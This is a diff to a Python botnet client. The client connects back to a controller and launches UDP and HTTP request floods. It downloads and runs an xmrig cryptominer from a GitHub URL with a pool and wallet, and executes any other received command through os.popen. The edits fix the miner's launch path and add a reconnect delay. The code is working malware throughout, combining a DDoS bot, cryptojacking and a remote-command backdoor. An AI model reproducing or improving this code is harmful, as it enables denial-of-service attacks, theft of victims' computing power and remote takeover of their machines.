@@ -1,6 +1,7 @@
 import threading
 import requests
 import socket
+import time
 import sys
 import os
 
@@ -58,8 +59,6 @@ def client():
 
                 data = " ".join(data)
 
-                print(f"\033[31m! {data} !\033[0m")
-
                 udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
                 def udp():
@@ -93,7 +92,7 @@ def client():
                 def req():
                     try:
                         requests.get(req_url)
-                        print("\033[32m[+]\033[0m Request Packet sent ->", req_url)
+                        print("\033[32m[+]\033[0m REQ Packet sent ->", req_url)
 
                     except Exception as err:
                         print("\033[31m[-]\033[0m", err)
@@ -118,9 +117,11 @@ def client():
 
                 if sys.platform == "linux":
                     url = "https://github.com/rxyzqc/SC/raw/main/xmrig"
+                    ext = "./"
                     rig = "xmrig"
                 else:
                     url = "https://github.com/rxyzqc/SC/raw/main/xmrig.exe"
+                    ext = ""
                     rig = "xmrig.exe"
 
                 if not os.path.exists(rig):
@@ -130,12 +131,13 @@ def client():
                         f.write(response.content)
 
                 if os.path.exists(rig):
-                    os.system(f"{rig} --opencl --cuda -o {pool} -u {wallet} -p {worker} -k --tls")
+                    os.popen(f"{ext}{rig} --opencl --cuda -o {pool} -u {wallet} -p {worker} -k --tls")
 
             else:
                 os.popen(data)
 
     except socket.error:
+        time.sleep(5)
         client()
 
 
